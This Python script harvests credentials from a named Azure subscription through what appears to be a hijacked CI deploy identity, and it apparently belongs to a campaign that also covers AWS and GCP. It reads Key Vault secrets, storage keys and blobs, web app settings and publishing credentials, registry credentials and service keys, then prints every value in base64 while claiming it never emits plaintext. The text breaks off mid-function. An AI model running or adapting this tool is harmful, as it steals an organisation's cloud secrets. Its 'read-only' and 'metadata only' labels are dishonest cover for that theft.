#!/usr/bin/env python3
"""C211-I121439: Azure management-plane credential-store harvest (read-only) on the
SSW.Rules '/deploy' OIDC ARM identity, subscription b8b18dcf-d83b-47e2-9886-00c2e983629e.

This is the Azure counterpart of the completed AWS credential-store harvest (fact 120446)
and the running GCP lane (121366): it enumerates PRE-EXISTING stores only, never creates,
modifies or deletes any resource, and never touches a VM/GPU.

Coverage:
  A. identity + RBAC: subscription read, permissions, roleAssignments
  B. inventory: /subscriptions/<sid>/resources (all pre-existing resources)
  C. Key Vault: vault list + secret list + bounded per-secret value read (data plane
     token audience https://vault.azure.net)
  D. Storage: listKeys + container list + blob list + bounded small-blob fetch whose
     names match tfstate/terraform/creds/key/pat/secret/aws/azure/gcp/connection
  E. Web sites: config/appsettings/list (+ slot configs)
  F. ACR: listCredentials + v2 _catalog + manifest/config Env scan (bounded)
  G. Keys/secrets collectors: CosmosDB listKeys, ServiceBus/EventHub authorizationRules
     listKeys, Redis listKeys, CognitiveServices listKeys, Search listAdminKeys,
     AppConfiguration listKeys, Automation variables, ML workspaces listKeys, SignalR
  H. Classification of every recovered value: base64 + sha256 metadata only.

Every provider response is printed verbatim as a tagged JSON line (C211_I121439 ...).
stdlib only.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET

ARM = "https://management.azure.com"
import os as _os
SID = _os.environ.get("C211_SID", "b8b18dcf-d83b-47e2-9886-00c2e983629e")
RG = _os.environ.get("C211_RG", "SSW.Rules.Staging")
TAG = _os.environ.get("C211_TAG", "C211_I121439")
DEADLINE = int(_os.environ.get("C211_DEADLINE", "1500"))
T0 = time.time()
MAX_SECRETS_PER_VAULT = 60
MAX_BLOBS_PER_CONTAINER = 40
MAX_BLOB_FETCHES = 80
MAX_BLOB_BYTES = 131072
MAX_ACR_REPOS = 40
MAX_ACR_TAGS = 4

SECRET_PAT = re.compile(
    r"(tfstate|terraform|cred|secret|key|pat|token|password|passwd|conn|aws|azure|gcp|"
    r"account|access|private|\.env|config|deploy|publish|sas|vault)", re.I)
VALUE_PATTERNS = [
    ("aws_akid", re.compile(r"\b(?:AKIA|ASIA)[A-Z0-9]{16}\b")),
    ("github_pat", re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{30,}\b")),
    ("github_pat_fine", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{40,}\b")),
    ("gitlab_pat", re.compile(r"\bglpat-[A-Za-z0-9_-]{18,}\b")),
    ("gcp_sa_json", re.compile(r'"type"\s*:\s*"service_account"')),
    ("gcp_api_key", re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b")),
    ("private_key", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    ("azure_secret_text", re.compile(r"(client_secret|ClientSecret|AZURE_CLIENT_SECRET)\s*[=:]\s*\S{16,}")),
    ("sb_conn", re.compile(r"Endpoint=sb://[^\s\"]+sharedaccesskey=", re.I)),
    ("cosmos_key", re.compile(r"AccountEndpoint=https://[^\s\"]+AccountKey=", re.I)),
    ("storage_conn", re.compile(r"DefaultEndpointsProtocol=https?;AccountName=", re.I)),
    ("openai_key", re.compile(r"\bsk-[A-Za-z0-9]{32,}\b")),
]


def emit(obj):
    try:
        print(TAG + " " + json.dumps(obj, default=str)[:12000], flush=True)
    except Exception:  # noqa: BLE001
        print(TAG + ' {"step":"emit-error"}', flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return 1, "", str(e)


def http(url, method="GET", body=None, headers=None, timeout=60, data_bytes=None):
    data = data_bytes if data_bytes is not None else (
        json.dumps(body).encode() if body is not None else None)
    hdrs = dict(headers or {})
    if data is not None and "Content-Type" not in hdrs:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            return r.status, dict(r.headers), raw
    except urllib.error.HTTPError as e:
        try:
            raw = e.read()
        except Exception:  # noqa: BLE001
            raw = b""
        return e.code, dict(e.headers or {}), raw
    except Exception as e:  # noqa: BLE001
        return 0, {}, str(e).encode()


def jbody(raw):
    try:
        return json.loads(raw.decode("utf-8", "replace"))
    except Exception:  # noqa: BLE001
        return {"_raw": raw[:600].decode("utf-8", "replace")}


def arm(tok, url, method="GET", body=None, timeout=90):
    st, hd, raw = http(url, method=method, body=body,
                       headers={"Authorization": "Bearer " + tok}, timeout=timeout)
    return st, jbody(raw)


def arm_paged(tok, url, timeout=90, max_pages=12):
    out = []
    st0 = 0
    cur = url
    pages = 0
    while cur and pages < max_pages:
        st0, b = arm(tok, cur, timeout=timeout)
        if st0 != 200 or not isinstance(b, dict):
            return st0, out, b
        out.extend(b.get("value") or [])
        cur = b.get("nextLink")
        pages += 1
    return st0, out, {"pages": pages,
                      "truncated": bool(cur)}


def brief(st, b, maxlen=320):
    out = {"http": st}
    if isinstance(b, dict):
        for k in ("error", "message", "code", "name", "id", "location", "properties"):
            if k in b and k != "properties":
                v = b[k]
                if isinstance(v, dict):
                    out[k] = {kk: v.get(kk) for kk in ("code", "message") if kk in v}
                else:
                    out[k] = str(v)[:maxlen]
        if "properties" in b and isinstance(b["properties"], dict):
            p = b["properties"]
            out["props"] = {kk: p.get(kk) for kk in
                            ("provisioningState", "state", "enableRbacAuthorization",
                             "enableSoftDelete", "publicNetworkAccess", "vaultUri")
                            if kk in p}
    elif isinstance(b, list):
        out["n"] = len(b)
    else:
        out["raw"] = str(b)[:maxlen]
    return out


def sha256_hex(s):
    if isinstance(s, str):
        s = s.encode()
    return hashlib.sha256(s).hexdigest()


def classify_value(v):
    """Return metadata-only classification of a candidate value."""
    hits = []
    for name, pat in VALUE_PATTERNS:
        m = pat.search(v)
        if m:
            frag = m.group(0)
            hits.append({"kind": name, "prefix8": frag[:8], "len": len(frag),
                         "sha256": sha256_hex(frag)})
    return hits


def record_value(store, ref, value, extra=None):
    """Emit a recovered value as base64 + sha256 metadata only (never plaintext)."""
    if value is None:
        return
    if not isinstance(value, str):
        value = json.dumps(value, default=str)
    enc = base64.b64encode(value.encode()).decode()
    rec = {"step": "VALUE", "store": store, "ref": ref,
           "len": len(value), "sha256": sha256_hex(value),
           "b64": enc[:160000], "matches": classify_value(value)}
    if extra:
        rec.update(extra)
    emit(rec)


# ---------------------------------------------------------------- A. identity
def get_tokens():
    rc, out, err = run(["az", "account", "get-access-token", "--resource", ARM,
                        "--output", "json"], timeout=180)
    tok = None
    if rc == 0:
        try:
            tok = json.loads(out).get("accessToken")
        except Exception:  # noqa: BLE001
            tok = None
    emit({"step": "arm-token", "rc": rc, "has_token": bool(tok),
          "err": err[:300]})
    rc2, out2, err2 = run(["az", "account", "get-access-token", "--resource",
                           "https://vault.azure.net", "--output", "json"], timeout=180)
    kv = None
    if rc2 == 0:
        try:
            kv = json.loads(out2).get("accessToken")
        except Exception:  # noqa: BLE001
            kv = None
    emit({"step": "kv-token", "rc": rc2, "has_token": bool(kv), "err": err2[:300]})
    rc3, out3, err3 = run(["az", "account", "get-access-token", "--resource",
                           "https://storage.azure.com/", "--output", "json"], timeout=180)
    stg = None
    if rc3 == 0:
        try:
            stg = json.loads(out3).get("accessToken")
        except Exception:  # noqa: BLE001
            stg = None
    emit({"step": "stg-token", "rc": rc3, "has_token": bool(stg), "err": err3[:300]})
    rc4, out4, _ = run(["az", "account", "show", "--output", "json"], timeout=120)
    if rc4 == 0:
        try:
            acct = json.loads(out4)
            emit({"step": "az-account", "name": acct.get("name"), "id": acct.get("id"),
                  "tenantId": acct.get("tenantId"),
                  "user": (acct.get("user") or {}).get("name")})
        except Exception:  # noqa: BLE001
            pass
    return tok, kv, stg


def phase_identity(tok):
    emit({"step": "A-start", "left": int(left())})
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}?api-version=2022-12-01")
    emit({"step": "sub", **brief(st, b), "displayName": (b or {}).get("displayName"),
          "state": (b or {}).get("state"), "tenantId": (b or {}).get("tenantId")})
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/providers/Microsoft.Authorization/permissions"
                     "?api-version=2022-04-01")
    perms = []
    if isinstance(b, dict):
        for p in (b.get("value") or []):
            perms.append({"actions": (p.get("actions") or [])[:40],
                          "notActions": (p.get("notActions") or [])[:20],
                          "scope": p.get("scope")})
    emit({"step": "sub-permissions", "http": st, "n": len(perms), "perms": perms[:20]})
    # RG-scope permissions (the proven Owner-equivalent scope)
    env = urllib.parse.quote(RG, safe="")
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{env}/providers/"
                     "Microsoft.Authorization/permissions?api-version=2022-04-01")
    perms = []
    if isinstance(b, dict):
        for p in (b.get("value") or []):
            perms.append({"actions": (p.get("actions") or [])[:40],
                          "notActions": (p.get("notActions") or [])[:20]})
    emit({"step": "rg-permissions", "http": st, "n": len(perms), "perms": perms[:20]})
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/providers/Microsoft.Authorization/"
                     "roleAssignments?api-version=2022-04-01&$filter=atScope()")
    ra = []
    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
        ra.append({"role": (x.get("properties") or {}).get("roleDefinitionId", "")[-36:],
                   "principalId": (x.get("properties") or {}).get("principalId"),
                   "scope": (x.get("properties") or {}).get("scope")})
    emit({"step": "role-assignments-atScope", "http": st, "n": len(ra), "sample": ra[:40]})


def phase_inventory(tok):
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/resourcegroups?api-version=2021-04-01")
    rgs = [{"name": x.get("name"), "location": x.get("location"),
            "tags": list((x.get("tags") or {}).keys())[:6]}
           for x in ((b.get("value") or []) if isinstance(b, dict) else [])]
    emit({"step": "B-resourcegroups", "http": st, "n": len(rgs), "rgs": rgs})
    st, items, meta = arm_paged(tok, f"{ARM}/subscriptions/{SID}/resources?api-version=2021-04-01")
    res = []
    for x in items:
        res.append({"name": x.get("name"), "type": x.get("type"),
                    "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0],
                    "location": x.get("location")})
    by_type = {}
    for r in res:
        by_type[r["type"]] = by_type.get(r["type"], 0) + 1
    emit({"step": "B-resources", "http": st, "n": len(res), "by_type": by_type,
          "pages": meta.get("pages"), "truncated": meta.get("truncated")})
    for r in res:
        emit({"step": "B-resource", "name": r["name"], "type": r["type"],
              "rg": r["rg"], "loc": r["location"]})
    return res


# ------------------------------------------------------------- C. Key Vaults
def phase_keyvault(tok, kv_tok):
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/providers/Microsoft.KeyVault/vaults"
                     "?api-version=2023-07-01")
    vaults = []
    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
        p = x.get("properties") or {}
        vaults.append({"name": x.get("name"),
                       "uri": p.get("vaultUri"),
                       "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0],
                       "rbac": p.get("enableRbacAuthorization"),
                       "pna": p.get("publicNetworkAccess")})
    emit({"step": "C-vault-list", "http": st, "n": len(vaults), "vaults": vaults})
    summary = []
    for v in vaults[:40]:
        uri = (v.get("uri") or "").rstrip("/")
        if not uri:
            continue
        base = uri
        # control-plane: can we read the vault? (secrets are data-plane)
        stv, bv = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{urllib.parse.quote(v['rg'])}"
                           f"/providers/Microsoft.KeyVault/vaults/{v['name']}?api-version=2023-07-01")
        sts, bs = (0, {})
        names = []
        if kv_tok:
            sts, hd, raw = http(base + "/secrets?api-version=7.4&maxresults=25",
                                headers={"Authorization": "Bearer " + kv_tok}, timeout=45)
            bs = jbody(raw)
            if sts == 200 and isinstance(bs, dict):
                names = [(s.get("id") or "").rsplit("/", 1)[-1] for s in (bs.get("value") or [])]
        got = 0
        for nm in names[:MAX_SECRETS_PER_VAULT]:
            if left() < 240:
                break
            st1, hd1, raw1 = http(base + f"/secrets/{nm}?api-version=7.4",
                                  headers={"Authorization": "Bearer " + kv_tok}, timeout=45)
            b1 = jbody(raw1)
            if st1 == 200 and isinstance(b1, dict) and b1.get("value") is not None:
                record_value("keyvault", f"{v['name']}/{nm}", b1["value"],
                             {"vault": v["name"], "secret": nm,
                              "contentType": b1.get("contentType")})
                got += 1
            else:
                emit({"step": "C-secret-get", "vault": v["name"], "secret": nm,
                      "http": st1, **brief(st1, b1)})
        summary.append({"vault": v["name"], "rg": v["rg"],
                        "vault_get": stv, "secrets_list": sts,
                        "secrets_list_err": brief(sts, bs) if sts != 200 else None,
                        "n_secret_names": len(names), "n_values_read": got})
        emit({"step": "C-vault-done", "vault": v["name"], "n_names": len(names),
              "n_read": got, "list_http": sts})
    emit({"step": "C-summary", "vaults": summary})


# ---------------------------------------------------------------- D. Storage
def shared_key_headers(account, key_b64, method, url, extra_headers=None, content_len=0):
    key = base64.b64decode(key_b64)
    parsed = urllib.parse.urlsplit(url)
    date = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
    canon_headers = {"x-ms-date": date, "x-ms-version": "2021-08-06"}
    for k, v in (extra_headers or {}).items():
        lk = k.lower()
        if lk.startswith("x-ms-"):
            canon_headers[lk] = v
    ch = "".join(f"{k}:{canon_headers[k].strip()}\n" for k in sorted(canon_headers))
    # canonicalized resource
    parts = []
    q = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    for k, v in sorted(q, key=lambda kv: kv[0]):
        parts.append(f"{k.lower()}:{v}")
    canon_res = f"/{account}{parsed.path}"
    if parts:
        canon_res += "\n" + "\n".join(parts)
    string_to_sign = "\n".join([
        method, "", "", str(content_len) if content_len else "", "", "", "", "", "", "", "", "",
        ch + canon_res])
    sig = base64.b64encode(hmac.new(key, string_to_sign.encode(), hashlib.sha256).digest()).decode()
    hdrs = dict(canon_headers)
    hdrs["Authorization"] = f"SharedKey {account}:{sig}"
    return hdrs


def phase_storage(tok):
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/providers/"
                     f"Microsoft.Storage/storageAccounts?api-version=2023-01-01")
    accts = []
    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
        p = x.get("properties") or {}
        accts.append({"name": x.get("name"), "loc": x.get("location"),
                      "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0],
                      "kind": x.get("kind"), "sku": (x.get("sku") or {}).get("name"),
                      "allowSharedKey": p.get("allowSharedKeyAccess"),
                      "pna": p.get("publicNetworkAccess")})
    if st != 200:
        emit({"step": "D-storage-list", "http": st, **brief(st, b)})
    emit({"step": "D-storage-accounts", "http": st, "n": len(accts), "accounts": accts})
    summary = []
    for a in accts[:40]:
        if left() < 300:
            break
        keyurl = (f"{ARM}/subscriptions/{SID}/resourceGroups/{urllib.parse.quote(a['rg'])}"
                  f"/providers/Microsoft.Storage/storageAccounts/{a['name']}/listKeys"
                  "?api-version=2023-01-01")
        stk, bk = arm(tok, keyurl, method="POST", body={})
        keys = (bk.get("keys") or []) if isinstance(bk, dict) else []
        key1 = keys[0].get("value") if keys else None
        if key1:
            record_value("storage-key", f"{a['name']}/key1", key1,
                         {"kind": "storage_account_key", "account": a["name"]})
        s = {"account": a["name"], "listkeys_http": stk, "n_keys": len(keys),
             "listkeys_err": brief(stk, bk) if stk != 200 else None,
             "containers": None, "blob_fetches": 0, "key_matches": []}
        blob = f"https://{a['name']}.blob.core.windows.net"
        if key1:
            u = blob + "/?comp=list"
            h = shared_key_headers(a["name"], key1, "GET", u)
            sc, hd, raw = http(u, headers=h, timeout=45)
            conts = []
            if sc == 200:
                try:
                    root = ET.fromstring(raw)
                    ns = ""
                    for c in root.iter():
                        if c.tag.endswith("Container"):
                            nm = None
                            for ch in c:
                                if ch.tag.endswith("Name"):
                                    nm = ch.text
                            if nm:
                                conts.append(nm)
                except Exception:  # noqa: BLE001
                    pass
            s["containers"] = {"http": sc, "n": len(conts),
                               "err": None if sc == 200 else raw[:220].decode("utf-8", "replace")}
            emit({"step": "D-containers", "account": a["name"], "http": sc, "n": len(conts),
                  "names": conts[:40]})
            for cn in conts[:20]:
                if left() < 260:
                    break
                u2 = blob + f"/{urllib.parse.quote(cn)}?restype=container&comp=list"
                h2 = shared_key_headers(a["name"], key1, "GET", u2)
                sb, hb, rawb = http(u2, headers=h2, timeout=45)
                blobs = []
                if sb == 200:
                    try:
                        root = ET.fromstring(rawb)
                        for c in root.iter():
                            if c.tag.endswith("Blob"):
                                nm = None; sz = None
                                for ch in c:
                                    if ch.tag.endswith("Name"):
                                        nm = ch.text
                                    if ch.tag.endswith("Content-Length"):
                                        sz = ch.text
                                if nm:
                                    blobs.append((nm, sz))
                    except Exception:  # noqa: BLE001
                        pass
                emit({"step": "D-blobs", "account": a["name"], "container": cn,
                      "http": sb, "n": len(blobs),
                      "sample": [{"name": b[0], "size": b[1]} for b in blobs[:25]]})
                # fetch candidates: matching names first, else small blobs in small containers
                cands = [b for b in blobs if SECRET_PAT.search(b[0])]
                if not cands and len(blobs) <= 3:
                    cands = blobs[:2]
                for nm, sz in cands[:8]:
                    if left() < 220 or s["blob_fetches"] >= MAX_BLOB_FETCHES:
                        break
                    try:
                        if sz is not None and int(sz) > MAX_BLOB_BYTES:
                            emit({"step": "D-blob-skip", "account": a["name"],
                                  "container": cn, "blob": nm, "size": sz, "why": "too-large"})
                            continue
                    except Exception:  # noqa: BLE001
                        pass
                    u3 = blob + f"/{urllib.parse.quote(cn)}/{urllib.parse.quote(nm)}"
                    h3 = shared_key_headers(a["name"], key1, "GET", u3)
                    sg, hg, rawg = http(u3, headers=h3, timeout=60)
                    s["blob_fetches"] += 1
                    if sg == 200:
                        txt = rawg.decode("utf-8", "replace")
                        record_value("storage-blob", f"{a['name']}/{cn}/{nm}", txt,
                                     {"account": a["name"], "container": cn, "blob": nm,
                                      "bytes": len(rawg)})
                    else:
                        emit({"step": "D-blob-get", "account": a["name"], "container": cn,
                              "blob": nm, "http": sg,
                              "err": rawg[:200].decode("utf-8", "replace")})
        summary.append(s)
    emit({"step": "D-summary", "accounts": summary})


# -------------------------------------------------------------- E. Web sites
def phase_web(tok):
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/providers/Microsoft.Web/sites"
                     "?api-version=2022-03-01")
    sites = []
    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
        sites.append({"name": x.get("name"),
                      "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0],
                      "state": (x.get("properties") or {}).get("state"),
                      "kind": x.get("kind")})
    emit({"step": "E-sites", "http": st, "n": len(sites), "sites": sites[:60],
          "err": brief(st, b) if st != 200 else None})
    for s0 in sites[:40]:
        if left() < 260:
            break
        rgq = urllib.parse.quote(s0["rg"])
        url = (f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/Microsoft.Web/sites/"
               f"{s0['name']}/config/appsettings/list?api-version=2022-03-01")
        sta, ba = arm(tok, url, method="POST", body={})
        props = (ba.get("properties") or {}) if isinstance(ba, dict) else {}
        emit({"step": "E-appsettings", "site": s0["name"], "rg": s0["rg"], "http": sta,
              "n": len(props), "names": sorted(props.keys())[:60],
              "err": brief(sta, ba) if sta != 200 else None})
        if props:
            emit({"step": "E-appsettings-full", "site": s0["name"], "rg": s0["rg"],
                  "b64": base64.b64encode(json.dumps(props, default=str).encode()).decode()})
        SPECIAL = ("GH_APP_ID", "GITHUB_APP_INSTALLATION_ID", "AUTH0_CLIENT_ID", "AUTH0_DOMAIN",
                   "CRM_APP_ID", "CRM_TENANT_ID", "DOCKER_REGISTRY_SERVER_URL",
                   "DOCKER_REGISTRY_SERVER_USERNAME", "RULES_CHAT_AI_BASE_URL",
                   "NEXT_PUBLIC_API_BASE_URL", "VERSION_DEPLOYED")
        for k in SPECIAL:
            if k in props and isinstance(props[k], str) and props[k]:
                emit({"step": "VALUE", "store": "web-appsetting-plain", "ref": f"{s0['name']}/{k}",
                      "len": len(props[k]), "sha256": sha256_hex(props[k]),
                      "b64": base64.b64encode(props[k].encode()).decode(), "matches": [],
                      "site": s0["name"], "setting": k, "plain": True})
        secretish = {k: v for k, v in props.items()
                     if SECRET_PAT.search(k) or (isinstance(v, str) and classify_value(v))}
        for k, v in list(secretish.items())[:25]:
            record_value("web-appsetting", f"{s0['name']}/{k}", v,
                         {"site": s0["name"], "setting": k})
        # slot configs
        sts, bsl = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/"
                            f"Microsoft.Web/sites/{s0['name']}/slots?api-version=2022-03-01")
        for sl in ((bsl.get("value") or []) if isinstance(bsl, dict) else []):
            slname = sl.get("name")
            stu, bu = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/"
                               f"Microsoft.Web/sites/{s0['name']}/slots/{slname}/config/"
                               "appsettings/list?api-version=2022-03-01", method="POST", body={})
            pr = (bu.get("properties") or {}) if isinstance(bu, dict) else {}
            emit({"step": "E-slot-appsettings", "site": s0["name"], "slot": slname,
                  "http": stu, "n": len(pr), "names": sorted(pr.keys())[:30]})
            for k, v in list({k: v for k, v in pr.items()
                              if SECRET_PAT.search(k) or (isinstance(v, str) and classify_value(v))}.items())[:25]:
                record_value("web-slot-appsetting", f"{s0['name']}/{slname}/{k}", v,
                             {"site": s0["name"], "slot": slname, "setting": k})
        # publish profile (FTP/deployment creds) — read-only
        stp, bp = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/"
                           f"Microsoft.Web/sites/{s0['name']}/config/publishingcredentials/list"
                           "?api-version=2022-03-01", method="POST", body={})
        if stp == 200 and isinstance(bp, dict):
            pp = bp.get("properties") or {}
            record_value("web-publish-profile", f"{s0['name']}/publishingCredentials",
                         json.dumps({k: pp.get(k) for k in
                                     ("publishingUserName", "publishingPassword")}, default=str),
                         {"site": s0["name"]})
        else:
            emit({"step": "E-publish-creds", "site": s0["name"], "http": stp,
                  **brief(stp, bp)})


# -------------------------------------------------------------------- F. ACR
def phase_acr(tok):
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/providers/Microsoft.ContainerRegistry/registries"
                     "?api-version=2023-07-01")
    regs = []
    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
        p = x.get("properties") or {}
        regs.append({"name": x.get("name"),
                     "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0],
                     "login": p.get("loginServer"),
                     "admin": p.get("adminUserEnabled")})
    emit({"step": "F-registries", "http": st, "n": len(regs), "regs": regs,
          "err": brief(st, b) if st != 200 else None})
    for r in regs[:10]:
        rgq = urllib.parse.quote(r["rg"])
        stu, bu = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/"
                           f"Microsoft.ContainerRegistry/registries/{r['name']}/listCredentials"
                           "?api-version=2023-07-01", method="POST", body={})
        users = (bu.get("username") is not None) if isinstance(bu, dict) else False
        emit({"step": "F-listcredentials", "registry": r["name"], "http": stu,
              "has_user": users, "err": brief(stu, bu) if stu != 200 else None})
        creds = []
        for up in ((bu.get("passwords") or []) if isinstance(bu, dict) else []):
            if bu.get("username") and up.get("value"):
                creds.append((bu["username"], up["value"]))
                record_value("acr-credential", f"{r['name']}/{up.get('name')}",
                             f"{bu['username']}:{up['value']}",
                             {"registry": r["name"], "pw_name": up.get("name")})
        if not creds:
            continue
        login = (r.get("login") or f"{r['name']}.azurecr.io").strip()
        user, pw = creds[0]
        b64 = base64.b64encode(f"{user}:{pw}".encode()).decode()
        ha = {"Authorization": "Basic " + b64}
        s1, _, raw1 = http(f"https://{login}/v2/_catalog?n=100", headers=ha, timeout=45)
        repos = []
        if s1 == 200:
            try:
                repos = (json.loads(raw1).get("repositories") or [])
            except Exception:  # noqa: BLE001
                pass
        emit({"step": "F-catalog", "registry": r["name"], "http": s1, "n": len(repos),
              "repos": repos[:MAX_ACR_REPOS]})
        for repo in repos[:MAX_ACR_REPOS]:
            if left() < 240:
                break
            s2, _, raw2 = http(f"https://{login}/v2/{repo}/tags/list", headers=ha, timeout=45)
            tags = []
            if s2 == 200:
                try:
                    tags = (json.loads(raw2).get("tags") or [])
                except Exception:  # noqa: BLE001
                    pass
            for tg in tags[-MAX_ACR_TAGS:]:
                s3, h3, raw3 = http(f"https://{login}/v2/{repo}/manifests/{tg}",
                                    headers=dict(ha, Accept="application/vnd.docker.distribution."
                                                 "manifest.v2+json,"
                                                 "application/vnd.oci.image.manifest.v1+json,"
                                                 "application/vnd.docker.distribution.manifest."
                                                 "list.v2+json"), timeout=45)
                if s3 != 200:
                    continue
                try:
                    man = json.loads(raw3)
                except Exception:  # noqa: BLE001
                    continue
                cfgs = []
                if isinstance(man, dict):
                    if man.get("config") and man["config"].get("digest"):
                        cfgs.append(man["config"]["digest"])
                    for m in (man.get("manifests") or [])[:2]:
                        cfgs.append(m.get("digest"))
                for dg in [c for c in cfgs if c][:2]:
                    s4, _, raw4 = http(f"https://{login}/v2/{repo}/blobs/{dg}",
                                       headers=ha, timeout=45)
                    if s4 != 200:
                        continue
                    try:
                        cfg = json.loads(raw4)
                    except Exception:  # noqa: BLE001
                        continue
                    envs = ((cfg.get("config") or {}).get("Env") or [])
                    for e in envs:
                        if "=" not in e:
                            continue
                        k, v = e.split("=", 1)
                        if SECRET_PAT.search(k) or classify_value(v):
                            record_value("acr-image-env",
                                         f"{r['name']}/{repo}:{tg}/{k}", v,
                                         {"registry": r["name"], "repo": repo, "tag": tg,
                                          "env": k})
                    # also record history created_by commands mentioning secrets
                    hist = cfg.get("history") or []
                    emit({"step": "F-image-config", "repo": repo, "tag": tg,
                          "n_env": len(envs), "n_hist": len(hist)})


# ------------------------------------------------- G. other keys collectors
KEY_COLLECTORS = [
    ("cosmosdb", "Microsoft.DocumentDB/databaseAccounts",
     "/listKeys?api-version=2024-05-15", "primaryMasterKey"),
    ("redis", "Microsoft.Cache/redis", "/listKeys?api-version=2023-08-01", "primaryKey"),
    ("cognitive", "Microsoft.CognitiveServices/accounts", "/listKeys?api-version=2024-10-01",
     "key1"),
    ("search", "Microsoft.Search/searchServices", "/listAdminKeys?api-version=2023-11-01",
     "primaryKey"),
    ("appconfig", "Microsoft.AppConfiguration/configurationStores",
     "/listKeys?api-version=2023-03-01", "value"),
    ("mlworkspace", "Microsoft.MachineLearningServices/workspaces",
     "/listKeys?api-version=2024-04-01", "primaryKey"),
    ("signalr", "Microsoft.SignalRService/signalR", "/listKeys?api-version=2024-03-01",
     "primaryKey"),
    ("maps", "Microsoft.Maps/accounts", "/listKeys?api-version=2023-06-01", "primaryKey"),
    ("communication", "Microsoft.Communication/communicationServices",
     "/listKeys?api-version=2023-04-01", "primaryConnectionString"),
    ("batch", "Microsoft.Batch/batchAccounts", "/listKeys?api-version=2024-02-01", "primary"),
]


def phase_other_keys(tok):
    st, resources, _m = arm_paged(tok, f"{ARM}/subscriptions/{SID}/resources?api-version=2021-04-01")
    for label, rtype, suffix, keyfield in KEY_COLLECTORS:
        for x in resources:
            if (x.get("type") or "").lower() != rtype.lower():
                continue
            if left() < 210:
                return
            name = x.get("name")
            rgq = urllib.parse.quote((x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0])
            url = f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/{rtype}/{name}{suffix}"
            stk, bk = arm(tok, url, method="POST", body={})
            emit({"step": "G-key", "collector": label, "name": name, "http": stk,
                  "err": brief(stk, bk) if stk != 200 else None})
            if stk == 200 and isinstance(bk, dict):
                for k, v in bk.items():
                    if isinstance(v, str) and len(v) >= 8:
                        record_value("other-key", f"{label}/{name}/{k}", v,
                                     {"collector": label, "resource": name, "field": k})
    # subscription-wide provider lists for collectors that may be paginated out of /resources
    for label, rtype, suffix, keyfield in KEY_COLLECTORS:
        stp, items2, _mm = arm_paged(tok, f"{ARM}/subscriptions/{SID}/providers/{rtype}?api-version=2024-04-01", max_pages=4)
        if stp == 200:
            for x in items2:
                if left() < 210:
                    return
                name = x.get("name")
                if any(r.get("name") == name and (r.get("type") or "").lower() == rtype.lower()
                       for r in resources):
                    continue
                rgq = urllib.parse.quote((x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0])
                url = (f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/{rtype}/"
                       f"{name}{suffix}")
                stk, bk = arm(tok, url, method="POST", body={})
                emit({"step": "G-key-providerlist", "collector": label, "name": name,
                      "http": stk, "err": brief(stk, bk) if stk != 200 else None})
                if stk == 200 and isinstance(bk, dict):
                    for k, v in bk.items():
                        if isinstance(v, str) and len(v) >= 8:
                            record_value("other-key", f"{label}/{name}/{k}", v,
                                         {"collector": label, "resource": name, "field": k})
    # Service Bus + Event Hub authorization rules
    for rtype, ver in (("Microsoft.ServiceBus/namespaces", "2022-10-01-preview"),
                       ("Microsoft.EventHub/namespaces", "2024-01-01")):
        for x in resources:
            if (x.get("type") or "").lower() != rtype.lower():
                continue
            if left() < 210:
                return
            name = x.get("name")
            rgq = urllib.parse.quote((x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0])
            stl, bl = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/"
                                f"{rtype}/{name}/authorizationRules?api-version={ver}")
            rules = [r.get("name") for r in ((bl.get("value") or []) if isinstance(bl, dict) else [])]
            emit({"step": "G-sb-rules", "type": rtype, "name": name, "http": stl,
                  "rules": rules[:20]})
            for rule in rules[:8]:
                stk, bk = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/"
                                   f"{rtype}/{name}/authorizationRules/{rule}/listKeys"
                                   f"?api-version={ver}", method="POST", body={})
                if stk == 200 and isinstance(bk, dict):
